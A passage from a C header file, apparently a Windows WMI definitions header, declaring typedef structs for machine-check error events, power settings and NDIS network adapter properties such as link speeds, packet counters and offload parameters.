} MSMCAEvent_PCIComponentError, *PMSMCAEvent_PCIComponentError;

typedef struct _MSMCAEvent_SystemEventError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONGLONG VALIDATION_BITS;
  ULONGLONG SEL_TIME_STAMP;
  USHORT SEL_RECORD_ID;
  USHORT SEL_GENERATOR_ID;
  UCHAR SEL_RECORD_TYPE;
  UCHAR SEL_EVM_REV;
  UCHAR SEL_SENSOR_TYPE;
  UCHAR SEL_SENSOR_NUM;
  UCHAR SEL_EVENT_DIR_TYPE;
  UCHAR SEL_DATA1;
  UCHAR SEL_DATA2;
  UCHAR SEL_DATA3;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_SystemEventError, *PMSMCAEvent_SystemEventError;

typedef struct _MSMCAEvent_SMBIOSError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONGLONG VALIDATION_BITS;
  UCHAR SMBIOS_EVENT_TYPE;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_SMBIOSError, *PMSMCAEvent_SMBIOSError;

typedef struct _MSMCAEvent_PlatformSpecificError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONGLONG VALIDATION_BITS;
  ULONGLONG PLATFORM_ERROR_STATUS;
  ULONGLONG PLATFORM_REQUESTOR_ID;
  ULONGLONG PLATFORM_RESPONDER_ID;
  ULONGLONG PLATFORM_TARGET_ID;
  ULONGLONG PLATFORM_BUS_SPECIFIC_DATA;
  UCHAR OEM_COMPONENT_ID[16];
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_PlatformSpecificError, *PMSMCAEvent_PlatformSpecificError;

typedef struct _MSMCAEvent_InvalidError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_InvalidError, *PMSMCAEvent_InvalidError;

typedef struct _MSMCAEvent_MemoryPageRemoved {
  ULONGLONG PhysicalAddress;
} MSMCAEvent_MemoryPageRemoved, *PMSMCAEvent_MemoryPageRemoved;

typedef struct _MSMCAInfo_Entry {
  ULONG Length;
  UCHAR Data[1];
} MSMCAInfo_Entry, *PMSMCAInfo_Entry;

typedef struct _MSMCAInfo_RawMCAData {
  ULONG Count;
  MSMCAInfo_Entry Records[1];
} MSMCAInfo_RawMCAData, *PMSMCAInfo_RawMCAData;

typedef struct _MSMCAInfo_RawCMCEvent {
  ULONG Count;
  MSMCAInfo_Entry Records[1];
} MSMCAInfo_RawCMCEvent, *PMSMCAInfo_RawCMCEvent;

typedef struct _MSMCAInfo_RawMCAEvent {
  ULONG Count;
  MSMCAInfo_Entry Records[1];
} MSMCAInfo_RawMCAEvent, *PMSMCAInfo_RawMCAEvent;

typedef struct _MSMCAInfo_RawCorrectedPlatformEvent {
  ULONG Count;
  MSMCAInfo_Entry Records[1];
} MSMCAInfo_RawCorrectedPlatformEvent, *PMSMCAInfo_RawCorrectedPlatformEvent;

typedef struct _MSPower_DeviceEnable {
  BOOLEAN Enable;
} MSPower_DeviceEnable, *PMSPower_DeviceEnable;

typedef struct _MSPower_DeviceWakeEnable {
  BOOLEAN Enable;
} MSPower_DeviceWakeEnable, *PMSPower_DeviceWakeEnable;

typedef struct _MSNdis_NetworkAddress {
  UCHAR Address[6];
} MSNdis_NetworkAddress, *PMSNdis_NetworkAddress;

typedef struct _MSNdis_NetworkShortAddress {
  UCHAR Address[2];
} MSNdis_NetworkShortAddress, *PMSNdis_NetworkShortAddress;

typedef struct _MSNdis_NetworkLinkSpeed {
  ULONG Outbound;
  ULONG Inbound;
} MSNdis_NetworkLinkSpeed, *PMSNdis_NetworkLinkSpeed;

typedef struct _MSNdis_EnumerateAdapter {
  CHAR VariableData[1];
} MSNdis_EnumerateAdapter, *PMSNdis_EnumerateAdapter;

typedef struct _MSNdis_NotifyAdapterRemoval {
  CHAR VariableData[1];
} MSNdis_NotifyAdapterRemoval, *PMSNdis_NotifyAdapterRemoval;

typedef struct _MSNdis_NotifyAdapterArrival {
  CHAR VariableData[1];
} MSNdis_NotifyAdapterArrival, *PMSNdis_NotifyAdapterArrival;

typedef struct _MSNdis_DeviceWakeOnMagicPacketOnly {
  BOOLEAN EnableWakeOnMagicPacketOnly;
} MSNdis_DeviceWakeOnMagicPacketOnly, *PMSNdis_DeviceWakeOnMagicPacketOnly;

typedef struct _MSNdis_RSSEnabled {
  BOOLEAN RSSEnabled;
} MSNdis_RSSEnabled, *PMSNdis_RSSEnabled;

typedef struct _MSNdis_HardwareStatus {
  ULONG NdisHardwareStatus;
} MSNdis_HardwareStatus, *PMSNdis_HardwareStatus;

typedef struct _MSNdis_MediaSupported {
  ULONG NumberElements;
  ULONG NdisMediaSupported[1];
} MSNdis_MediaSupported, *PMSNdis_MediaSupported;

typedef struct _MSNdis_MediaInUse {
  ULONG NumberElements;
  ULONG NdisMediaInUse[1];
} MSNdis_MediaInUse, *PMSNdis_MediaInUse;

typedef struct _MSNdis_MaximumLookahead {
  ULONG NdisMaximumLookahead;
} MSNdis_MaximumLookahead, *PMSNdis_MaximumLookahead;

typedef struct _MSNdis_MaximumFrameSize {
  ULONG NdisMaximumFrameSize;
} MSNdis_MaximumFrameSize, *PMSNdis_MaximumFrameSize;

typedef struct _MSNdis_LinkSpeed {
  ULONG NdisLinkSpeed;
} MSNdis_LinkSpeed, *PMSNdis_LinkSpeed;

typedef struct _MSNdis_TransmitBufferSpace {
  ULONG NdisTransmitBufferSpace;
} MSNdis_TransmitBufferSpace, *PMSNdis_TransmitBufferSpace;

typedef struct _MSNdis_ReceiveBufferSpace {
  ULONG NdisReceiveBufferSpace;
} MSNdis_ReceiveBufferSpace, *PMSNdis_ReceiveBufferSpace;

typedef struct _MSNdis_TransmitBlockSize {
  ULONG NdisTransmitBlockSize;
} MSNdis_TransmitBlockSize, *PMSNdis_TransmitBlockSize;

typedef struct _MSNdis_ReceiveBlockSize {
  ULONG NdisReceiveBlockSize;
} MSNdis_ReceiveBlockSize, *PMSNdis_ReceiveBlockSize;

typedef struct _MSNdis_VendorID {
  ULONG NdisVendorID;
} MSNdis_VendorID, *PMSNdis_VendorID;

typedef struct _MSNdis_VendorDescription {
  CHAR VariableData[1];
} MSNdis_VendorDescription, *PMSNdis_VendorDescription;

typedef struct _MSNdis_CurrentPacketFilter {
  ULONG NdisCurrentPacketFilter;
} MSNdis_CurrentPacketFilter, *PMSNdis_CurrentPacketFilter;

typedef struct _MSNdis_CurrentLookahead {
  ULONG NdisCurrentLookahead;
} MSNdis_CurrentLookahead, *PMSNdis_CurrentLookahead;

typedef struct _MSNdis_DriverVersion {
  USHORT NdisDriverVersion;
} MSNdis_DriverVersion, *PMSNdis_DriverVersion;

typedef struct _MSNdis_MaximumTotalSize {
  ULONG NdisMaximumTotalSize;
} MSNdis_MaximumTotalSize, *PMSNdis_MaximumTotalSize;

typedef struct _MSNdis_MacOptions {
  ULONG NdisMacOptions;
} MSNdis_MacOptions, *PMSNdis_MacOptions;

typedef struct _MSNdis_MediaConnectStatus {
  ULONG NdisMediaConnectStatus;
} MSNdis_MediaConnectStatus, *PMSNdis_MediaConnectStatus;

typedef struct _MSNdis_MaximumSendPackets {
  ULONG NdisMaximumSendPackets;
} MSNdis_MaximumSendPackets, *PMSNdis_MaximumSendPackets;

typedef struct _MSNdis_VendorDriverVersion {
  ULONG NdisVendorDriverVersion;
} MSNdis_VendorDriverVersion, *PMSNdis_VendorDriverVersion;

typedef struct _MSNdis_VlanIdentifier {
  ULONG NdisVlanId;
} MSNdis_VlanIdentifier, *PMSNdis_VlanIdentifier;

typedef struct _MSNdis_PhysicalMediumType {
  ULONG NdisPhysicalMediumType;
} MSNdis_PhysicalMediumType, *PMSNdis_PhysicalMediumType;

typedef struct _MSNdis_TransmitsOk {
  ULONGLONG NdisTransmitsOk;
} MSNdis_TransmitsOk, *PMSNdis_TransmitsOk;

typedef struct _MSNdis_ReceivesOk {
  ULONGLONG NdisReceivesOk;
} MSNdis_ReceivesOk, *PMSNdis_ReceivesOk;

typedef struct _MSNdis_TransmitsError {
  ULONG NdisTransmitsError;
} MSNdis_TransmitsError, *PMSNdis_TransmitsError;

typedef struct _MSNdis_ReceiveError {
  ULONG NdisReceiveError;
} MSNdis_ReceiveError, *PMSNdis_ReceiveError;

typedef struct _MSNdis_ReceiveNoBuffer {
  ULONG NdisReceiveNoBuffer;
} MSNdis_ReceiveNoBuffer, *PMSNdis_ReceiveNoBuffer;

typedef struct _MSNdis_CoHardwareStatus {
  ULONG NdisCoHardwareStatus;
} MSNdis_CoHardwareStatus, *PMSNdis_CoHardwareStatus;

typedef struct _MSNdis_CoMediaSupported {
  ULONG NumberElements;
  ULONG NdisCoMediaSupported[1];
} MSNdis_CoMediaSupported, *PMSNdis_CoMediaSupported;

typedef struct _MSNdis_CoMediaInUse {
  ULONG NumberElements;
  ULONG NdisCoMediaInUse[1];
} MSNdis_CoMediaInUse, *PMSNdis_CoMediaInUse;

typedef struct _MSNdis_CoLinkSpeed {
  MSNdis_NetworkLinkSpeed NdisCoLinkSpeed;
} MSNdis_CoLinkSpeed, *PMSNdis_CoLinkSpeed;

typedef struct _MSNdis_CoVendorId {
  ULONG NdisCoVendorID;
} MSNdis_CoVendorId, *PMSNdis_CoVendorId;

typedef struct _MSNdis_CoVendorDescription {
  CHAR VariableData[1];
} MSNdis_CoVendorDescription, *PMSNdis_CoVendorDescription;

typedef struct _MSNdis_CoDriverVersion {
  USHORT NdisCoDriverVersion;
} MSNdis_CoDriverVersion, *PMSNdis_CoDriverVersion;

typedef struct _MSNdis_CoMacOptions {
  ULONG NdisCoMacOptions;
} MSNdis_CoMacOptions, *PMSNdis_CoMacOptions;

typedef struct _MSNdis_CoMediaConnectStatus {
  ULONG NdisCoMediaConnectStatus;
} MSNdis_CoMediaConnectStatus, *PMSNdis_CoMediaConnectStatus;

typedef struct _MSNdis_CoVendorDriverVersion {
  ULONG NdisCoVendorDriverVersion;
} MSNdis_CoVendorDriverVersion, *PMSNdis_CoVendorDriverVersion;

typedef struct _MSNdis_CoMinimumLinkSpeed {
  MSNdis_NetworkLinkSpeed NdisCoMinimumLinkSpeed;
} MSNdis_CoMinimumLinkSpeed, *PMSNdis_CoMinimumLinkSpeed;

typedef struct _MSNdis_CoTransmitPdusOk {
  ULONGLONG NdisCoTransmitPdusOk;
} MSNdis_CoTransmitPdusOk, *PMSNdis_CoTransmitPdusOk;

typedef struct _MSNdis_CoReceivePdusOk {
  ULONGLONG NdisCoReceivePdusOk;
} MSNdis_CoReceivePdusOk, *PMSNdis_CoReceivePdusOk;

typedef struct _MSNdis_CoTransmitPduErrors {
  ULONG NdisCoTransmitPduErrors;
} MSNdis_CoTransmitPduErrors, *PMSNdis_CoTransmitPduErrors;

typedef struct _MSNdis_CoReceivePduErrors {
  ULONG NdisCoReceivePduErrors;
} MSNdis_CoReceivePduErrors, *PMSNdis_CoReceivePduErrors;

typedef struct _MSNdis_CoReceivePdusNoBuffer {
  ULONG NdisCoReceivePdusNoBuffer;
} MSNdis_CoReceivePdusNoBuffer, *PMSNdis_CoReceivePdusNoBuffer;

typedef struct _MSNdis_AtmSupportedVcRates {
  ULONG MinCellRate;
  ULONG MaxCellRate;
} MSNdis_AtmSupportedVcRates, *PMSNdis_AtmSupportedVcRates;

typedef struct _MSNdis_AtmSupportedServiceCategory {
  ULONG NdisAtmSupportedServiceCategory;
} MSNdis_AtmSupportedServiceCategory, *PMSNdis_AtmSupportedServiceCategory;

typedef struct _MSNdis_AtmSupportedAalTypes {
  ULONG NdisAtmSupportedAalTypes;
} MSNdis_AtmSupportedAalTypes, *PMSNdis_AtmSupportedAalTypes;

typedef struct _MSNdis_AtmHardwareCurrentAddress {
  MSNdis_NetworkAddress NdisAtmHardwareCurrentAddress;
} MSNdis_AtmHardwareCurrentAddress, *PMSNdis_AtmHardwareCurrentAddress;

typedef struct _MSNdis_AtmMaxActiveVcs {
  ULONG NdisAtmMaxActiveVcs;
} MSNdis_AtmMaxActiveVcs, *PMSNdis_AtmMaxActiveVcs;

typedef struct _MSNdis_AtmMaxActiveVciBits {
  ULONG NdisAtmMaxActiveVciBits;
} MSNdis_AtmMaxActiveVciBits, *PMSNdis_AtmMaxActiveVciBits;

typedef struct _MSNdis_AtmMaxActiveVpiBits {
  ULONG NdisAtmMaxActiveVpiBits;
} MSNdis_AtmMaxActiveVpiBits, *PMSNdis_AtmMaxActiveVpiBits;

typedef struct _MSNdis_AtmMaxAal0PacketSize {
  ULONG NdisAtmMaxAal0PacketSize;
} MSNdis_AtmMaxAal0PacketSize, *PMSNdis_AtmMaxAal0PacketSize;

typedef struct _MSNdis_AtmMaxAal1PacketSize {
  ULONG NdisAtmMaxAal1PacketSize;
} MSNdis_AtmMaxAal1PacketSize, *PMSNdis_AtmMaxAal1PacketSize;

typedef struct _MSNdis_AtmMaxAal34PacketSize {
  ULONG NdisAtmMaxAal34PacketSize;
} MSNdis_AtmMaxAal34PacketSize, *PMSNdis_AtmMaxAal34PacketSize;

typedef struct _MSNdis_AtmMaxAal5PacketSize {
  ULONG NdisAtmMaxAal5PacketSize;
} MSNdis_AtmMaxAal5PacketSize, *PMSNdis_AtmMaxAal5PacketSize;

typedef struct _MSNdis_AtmReceiveCellsOk {
  ULONGLONG NdisAtmReceiveCellsOk;
} MSNdis_AtmReceiveCellsOk, *PMSNdis_AtmReceiveCellsOk;

typedef struct _MSNdis_AtmTransmitCellsOk {
  ULONGLONG NdisAtmTransmitCellsOk;
} MSNdis_AtmTransmitCellsOk, *PMSNdis_AtmTransmitCellsOk;

typedef struct _MSNdis_AtmReceiveCellsDropped {
  ULONGLONG NdisAtmReceiveCellsDropped;
} MSNdis_AtmReceiveCellsDropped, *PMSNdis_AtmReceiveCellsDropped;

typedef struct _MSNdis_EthernetPermanentAddress {
  MSNdis_NetworkAddress NdisPermanentAddress;
} MSNdis_EthernetPermanentAddress, *PMSNdis_EthernetPermanentAddress;

typedef struct _MSNdis_EthernetCurrentAddress {
  MSNdis_NetworkAddress NdisCurrentAddress;
} MSNdis_EthernetCurrentAddress, *PMSNdis_EthernetCurrentAddress;

typedef struct _MSNdis_EthernetMulticastList {
  ULONG NumberElements;
  MSNdis_NetworkAddress NdisMulticastList[1];
} MSNdis_EthernetMulticastList, *PMSNdis_EthernetMulticastList;

typedef struct _MSNdis_EthernetMaximumMulticastListSize {
  ULONG NdisEthernetMaximumMulticastListSize;
} MSNdis_EthernetMaximumMulticastListSize, *PMSNdis_EthernetMaximumMulticastListSize;

typedef struct _MSNdis_EthernetMacOptions {
  ULONG NdisEthernetMacOptions;
} MSNdis_EthernetMacOptions, *PMSNdis_EthernetMacOptions;

typedef struct _MSNdis_EthernetReceiveErrorAlignment {
  ULONG NdisEthernetReceiveErrorAlignment;
} MSNdis_EthernetReceiveErrorAlignment, *PMSNdis_EthernetReceiveErrorAlignment;

typedef struct _MSNdis_EthernetOneTransmitCollision {
  ULONG NdisEthernetOneTransmitCollision;
} MSNdis_EthernetOneTransmitCollision, *PMSNdis_EthernetOneTransmitCollision;

typedef struct _MSNdis_EthernetMoreTransmitCollisions {
  ULONG NdisEthernetMoreTransmitCollisions;
} MSNdis_EthernetMoreTransmitCollisions, *PMSNdis_EthernetMoreTransmitCollisions;

typedef struct _MSNdis_TokenRingPermanentAddress {
  MSNdis_NetworkAddress NdisPermanentAddress;
} MSNdis_TokenRingPermanentAddress, *PMSNdis_TokenRingPermanentAddress;

typedef struct _MSNdis_TokenRingCurrentAddress {
  MSNdis_NetworkAddress NdisCurrentAddress;
} MSNdis_TokenRingCurrentAddress, *PMSNdis_TokenRingCurrentAddress;

typedef struct _MSNdis_TokenRingCurrentFunctional {
  ULONG NdisTokenRingCurrentFunctional;
} MSNdis_TokenRingCurrentFunctional, *PMSNdis_TokenRingCurrentFunctional;

typedef struct _MSNdis_TokenRingCurrentGroup {
  ULONG NdisTokenRingCurrentGroup;
} MSNdis_TokenRingCurrentGroup, *PMSNdis_TokenRingCurrentGroup;

typedef struct _MSNdis_TokenRingLastOpenStatus {
  ULONG NdisTokenRingLastOpenStatus;
} MSNdis_TokenRingLastOpenStatus, *PMSNdis_TokenRingLastOpenStatus;

typedef struct _MSNdis_TokenRingCurrentRingStatus {
  ULONG NdisTokenRingCurrentRingStatus;
} MSNdis_TokenRingCurrentRingStatus, *PMSNdis_TokenRingCurrentRingStatus;

typedef struct _MSNdis_TokenRingCurrentRingState {
  ULONG NdisTokenRingCurrentRingState;
} MSNdis_TokenRingCurrentRingState, *PMSNdis_TokenRingCurrentRingState;

typedef struct _MSNdis_TokenRingLineErrors {
  ULONG NdisTokenRingLineErrors;
} MSNdis_TokenRingLineErrors, *PMSNdis_TokenRingLineErrors;

typedef struct _MSNdis_TokenRingLostFrames {
  ULONG NdisTokenRingLostFrames;
} MSNdis_TokenRingLostFrames, *PMSNdis_TokenRingLostFrames;

typedef struct _MSNdis_FddiLongPermanentAddress {
  MSNdis_NetworkAddress NdisPermanentAddress;
} MSNdis_FddiLongPermanentAddress, *PMSNdis_FddiLongPermanentAddress;

typedef struct _MSNdis_FddiLongCurrentAddress {
  MSNdis_NetworkAddress NdisCurrentAddress;
} MSNdis_FddiLongCurrentAddress, *PMSNdis_FddiLongCurrentAddress;

typedef struct _MSNdis_FddiLongMulticastList {
  ULONG NumberElements;
  MSNdis_NetworkAddress NdisMulticastList[1];
} MSNdis_FddiLongMulticastList, *PMSNdis_FddiLongMulticastList;

typedef struct _MSNdis_FddiLongMaximumListSize {
  ULONG NdisFddiLongMaximumListSize;
} MSNdis_FddiLongMaximumListSize, *PMSNdis_FddiLongMaximumListSize;

typedef struct _MSNdis_FddiShortPermanentAddress {
  MSNdis_NetworkShortAddress NdisPermanentAddress;
} MSNdis_FddiShortPermanentAddress, *PMSNdis_FddiShortPermanentAddress;

typedef struct _MSNdis_FddiShortCurrentAddress {
  MSNdis_NetworkShortAddress NdisCurrentAddress;
} MSNdis_FddiShortCurrentAddress, *PMSNdis_FddiShortCurrentAddress;

typedef struct _MSNdis_FddiShortMulticastList {
  ULONG NumberElements;
  MSNdis_NetworkShortAddress NdisMulticastList[1];
} MSNdis_FddiShortMulticastList, *PMSNdis_FddiShortMulticastList;

typedef struct _MSNdis_FddiShortMaximumListSize {
  ULONG NdisFddiShortMaximumListSize;
} MSNdis_FddiShortMaximumListSize, *PMSNdis_FddiShortMaximumListSize;

typedef struct _MSNdis_FddiAttachmentType {
  ULONG NdisFddiAttachmentType;
} MSNdis_FddiAttachmentType, *PMSNdis_FddiAttachmentType;

typedef struct _MSNdis_FddiUpstreamNodeLong {
  MSNdis_NetworkAddress NdisFddiUpstreamNodeLong;
} MSNdis_FddiUpstreamNodeLong, *PMSNdis_FddiUpstreamNodeLong;

typedef struct _MSNdis_FddiDownstreamNodeLong {
  MSNdis_NetworkAddress NdisFddiDownstreamNodeLong;
} MSNdis_FddiDownstreamNodeLong, *PMSNdis_FddiDownstreamNodeLong;

typedef struct _MSNdis_FddiFrameErrors {
  ULONG NdisFddiFrameErrors;
} MSNdis_FddiFrameErrors, *PMSNdis_FddiFrameErrors;

typedef struct _MSNdis_FddiFramesLost {
  ULONG NdisFddiFramesLost;
} MSNdis_FddiFramesLost, *PMSNdis_FddiFramesLost;

typedef struct _MSNdis_FddiRingManagmentState {
  ULONG NdisFddiRingManagmentState;
} MSNdis_FddiRingManagmentState, *PMSNdis_FddiRingManagmentState;

typedef struct _MSNdis_FddiLctFailures {
  ULONG NdisFddiLctFailures;
} MSNdis_FddiLctFailures, *PMSNdis_FddiLctFailures;

typedef struct _MSNdis_FddiLemRejects {
  ULONG NdisFddiLemRejects;
} MSNdis_FddiLemRejects, *PMSNdis_FddiLemRejects;

typedef struct _MSNdis_FddiLConnectionState {
  ULONG NdisFddiLConnectionState;
} MSNdis_FddiLConnectionState, *PMSNdis_FddiLConnectionState;

typedef struct _MSNdis_ObjectHeader {
  UCHAR Type;
  UCHAR Revision;
  USHORT Size;
} MSNdis_ObjectHeader, *PMSNdis_ObjectHeader;

typedef struct _MSNdis_WmiMethodHeader {
  MSNdis_ObjectHeader Header;
  ULONG PortNumber;
  ULONGLONG NetLuid;
  ULONGLONG RequestId;
  ULONG Timeout;
  ULONG Padding;
} MSNdis_WmiMethodHeader, *PMSNdis_WmiMethodHeader;

typedef struct _MSNdis_WmiSetHeader {
  MSNdis_ObjectHeader Header;
  ULONG PortNumber;
  ULONGLONG NetLuid;
  ULONGLONG RequestId;
  ULONG Timeout;
  ULONG Padding;
} MSNdis_WmiSetHeader, *PMSNdis_WmiSetHeader;

typedef struct _MSNdis_WmiOutputInfo {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  UCHAR SupportedRevision;
  UCHAR Padding1;
  USHORT Padding2;
  ULONG DataOffset;
} MSNdis_WmiOutputInfo, *PMSNdis_WmiOutputInfo;

typedef struct _MSNdis_WmiEnumAdapter {
  MSNdis_ObjectHeader Header;
  ULONG IfIndex;
  ULONGLONG NetLuid;
  CHAR VariableData[1];
} MSNdis_WmiEnumAdapter, *PMSNdis_WmiEnumAdapter;

typedef struct _MSNdis_LinkStateData {
  MSNdis_ObjectHeader Header;
  ULONG MediaConnectState;
  ULONG MediaDuplexState;
  ULONGLONG XmitLinkSpeed;
  ULONGLONG RcvLinkSpeed;
  ULONG PauseFunctions;
  ULONG AutoNegotiationFlags;
} MSNdis_LinkStateData, *PMSNdis_LinkStateData;

typedef struct _MSNdis_LinkParameters {
  MSNdis_ObjectHeader Header;
  ULONG MediaDuplexState;
  ULONGLONG XmitLinkSpeed;
  ULONGLONG RcvLinkSpeed;
  ULONG PauseFunctions;
  ULONG AutoNegotiationFlags;
} MSNdis_LinkParameters, *PMSNdis_LinkParameters;

typedef struct _MSNdis_InterruptModerationParameters {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG InterruptModeration;
} MSNdis_InterruptModerationParameters, *PMSNdis_InterruptModerationParameters;

typedef struct _MSNdis_StatisticsInfo {
  MSNdis_ObjectHeader Header;
  ULONG SupportedStatistics;
  ULONGLONG ifInDiscards;
  ULONGLONG ifInErrors;
  ULONGLONG ifHCInOctets;
  ULONGLONG ifHCInUcastPkts;
  ULONGLONG ifHCInMulticastPkts;
  ULONGLONG ifHCInBroadcastPkts;
  ULONGLONG ifHCOutOctets;
  ULONGLONG ifHCOutUcastPkts;
  ULONGLONG ifHCOutMulticastPkts;
  ULONGLONG ifHCOutBroadcastPkts;
  ULONGLONG ifOutErrors;
  ULONGLONG ifOutDiscards;
  ULONGLONG ifHCInUcastOctets;
  ULONGLONG ifHCInMulticastOctets;
  ULONGLONG ifHCInBroadcastOctets;
  ULONGLONG ifHCOutUcastOctets;
  ULONGLONG ifHCOutMulticastOctets;
  ULONGLONG ifHCOutBroadcastOctets;
} MSNdis_StatisticsInfo, *PMSNdis_StatisticsInfo;

typedef struct _MSNdis_PortStateData {
  MSNdis_ObjectHeader Header;
  ULONG MediaConnectState;
  ULONGLONG XmitLinkSpeed;
  ULONGLONG RcvLinkSpeed;
  ULONG Direction;
  ULONG SendControlState;
  ULONG RcvControlState;
  ULONG SendAuthorizationState;
  ULONG RcvAuthorizationState;
  ULONG Flags;
} MSNdis_PortStateData, *PMSNdis_PortStateData;

typedef struct _MSNdis_PortAuthParameters {
  MSNdis_ObjectHeader Header;
  ULONG SendControlState;
  ULONG RcvControlState;
  ULONG SendAuthorizationState;
  ULONG RcvAuthorizationState;
} MSNdis_PortAuthParameters, *PMSNdis_PortAuthParameters;

typedef struct _MSNdis_PortChar {
  MSNdis_ObjectHeader Header;
  ULONG PortNumber;
  ULONG Flags;
  ULONG Type;
  ULONG MediaConnectState;
  ULONGLONG XmitLinkSpeed;
  ULONGLONG RcvLinkSpeed;
  ULONG Direction;
  ULONG SendControlState;
  ULONG RcvControlState;
  ULONG SendAuthorizationState;
  ULONG RcvAuthorizationState;
} MSNdis_PortChar, *PMSNdis_PortChar;

typedef struct _MSNdis_PortArray {
  MSNdis_ObjectHeader Header;
  ULONG NumberOfPorts;
  ULONG OffsetFirstPort;
  ULONG ElementSize;
  MSNdis_PortChar Port[1];
} MSNdis_PortArray, *PMSNdis_PortArray;

typedef struct _MSNdis_PciDeviceProperty {
  MSNdis_ObjectHeader Header;
  ULONG DeviceType;
  ULONG CurrentSpeedAndMode;
  ULONG CurrentPayloadSize;
  ULONG MaxPayloadSize;
  ULONG MaxReadRequestSize;
  ULONG CurrentLinkSpeed;
  ULONG CurrentLinkWidth;
  ULONG MaxLinkSpeed;
  ULONG MaxLinkWidth;
} MSNdis_PciDeviceProperty, *PMSNdis_PciDeviceProperty;

typedef struct _MSNdis_WmiTcpLargeSendOffloadV1_IPv4 {
  ULONG Encapsulation;
  ULONG MaxOffLoadSize;
  ULONG MinSegmentCount;
  ULONG TcpOptions;
  ULONG IpOptions;
} MSNdis_WmiTcpLargeSendOffloadV1_IPv4, *PMSNdis_WmiTcpLargeSendOffloadV1_IPv4;

typedef struct _MSNdis_WmiTcpLargeSendOffloadV1 {
  MSNdis_WmiTcpLargeSendOffloadV1_IPv4 WmiIPv4;
} MSNdis_WmiTcpLargeSendOffloadV1, *PMSNdis_WmiTcpLargeSendOffloadV1;

typedef struct _MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive {
  ULONG Encapsulation;
  ULONG IpOptionsSupported;
  ULONG TcpOptionsSupported;
  ULONG TcpChecksum;
  ULONG UdpChecksum;
  ULONG IpChecksum;
} MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive, *PMSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive;

typedef struct _MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive {
  ULONG Encapsulation;
  ULONG IpExtensionHeadersSupported;
  ULONG TcpOptionsSupported;
  ULONG TcpChecksum;
  ULONG UdpChecksum;
} MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive, *PMSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive;

typedef struct _MSNdis_WmiTcpIpChecksumOffload {
  MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive IPv4Transmit;
  MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive IPv4Receive;
  MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive IPv6Transmit;
  MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive IPv6Receive;
} MSNdis_WmiTcpIpChecksumOffload, *PMSNdis_WmiTcpIpChecksumOffload;

typedef struct _MSNdis_WmiIPSecOffloadV1_Supported {
  ULONG Encapsulation;
  ULONG AhEspCombined;
  ULONG TransportTunnelCombined;
  ULONG IPv4Options;
  ULONG Flags;
} MSNdis_WmiIPSecOffloadV1_Supported, *PMSNdis_WmiIPSecOffloadV1_Supported;

typedef struct _MSNdis_WmiIPSecOffloadV1_IPv4AH {
  ULONG Md5;
  ULONG Sha_1;
  ULONG Transport;
  ULONG Tunnel;
  ULONG Send;
  ULONG Receive;
} MSNdis_WmiIPSecOffloadV1_IPv4AH, *PMSNdis_WmiIPSecOffloadV1_IPv4AH;

typedef struct _MSNdis_WmiIPSecOffloadV1_IPv4ESP {
  ULONG Des;
  ULONG Reserved;
  ULONG TripleDes;
  ULONG NullEsp;
  ULONG Transport;
  ULONG Tunnel;
  ULONG Send;
  ULONG Receive;
} MSNdis_WmiIPSecOffloadV1_IPv4ESP, *PMSNdis_WmiIPSecOffloadV1_IPv4ESP;

typedef struct _MSNdis_WmiIPSecOffloadV1 {
  MSNdis_WmiIPSecOffloadV1_Supported WmiSupported;
  MSNdis_WmiIPSecOffloadV1_IPv4AH WmiIPv4AH;
  MSNdis_WmiIPSecOffloadV1_IPv4ESP WmiIPv4ESP;
} MSNdis_WmiIPSecOffloadV1, *PMSNdis_WmiIPSecOffloadV1;

typedef struct _MSNdis_WmiTcpLargeSendOffloadV2_IPv4 {
  ULONG Encapsulation;
  ULONG MaxOffLoadSize;
  ULONG MinSegmentCount;
} MSNdis_WmiTcpLargeSendOffloadV2_IPv4, *PMSNdis_WmiTcpLargeSendOffloadV2_IPv4;

typedef struct _MSNdis_WmiTcpLargeSendOffloadV2_IPv6 {
  ULONG Encapsulation;
  ULONG MaxOffLoadSize;
  ULONG MinSegmentCount;
  ULONG IpExtensionHeadersSupported;
  ULONG TcpOptionsSupported;
} MSNdis_WmiTcpLargeSendOffloadV2_IPv6, *PMSNdis_WmiTcpLargeSendOffloadV2_IPv6;

typedef struct _MSNdis_WmiTcpLargeSendOffloadV2 {
  MSNdis_WmiTcpLargeSendOffloadV2_IPv4 WmiIPv4;
  MSNdis_WmiTcpLargeSendOffloadV2_IPv6 WmiIPv6;
} MSNdis_WmiTcpLargeSendOffloadV2, *PMSNdis_WmiTcpLargeSendOffloadV2;

typedef struct _MSNdis_WmiOffload {
  MSNdis_ObjectHeader Header;
  MSNdis_WmiTcpIpChecksumOffload Checksum;
  MSNdis_WmiTcpLargeSendOffloadV1 LsoV1;
  MSNdis_WmiIPSecOffloadV1 IPsecV1;
  MSNdis_WmiTcpLargeSendOffloadV2 LsoV2;
  ULONG Flags;
} MSNdis_WmiOffload, *PMSNdis_WmiOffload;

typedef struct _MSNdis_TcpOffloadParameters {
  MSNdis_ObjectHeader Header;
  UCHAR IPv4Checksum;
  UCHAR TCPIPv4Checksum;
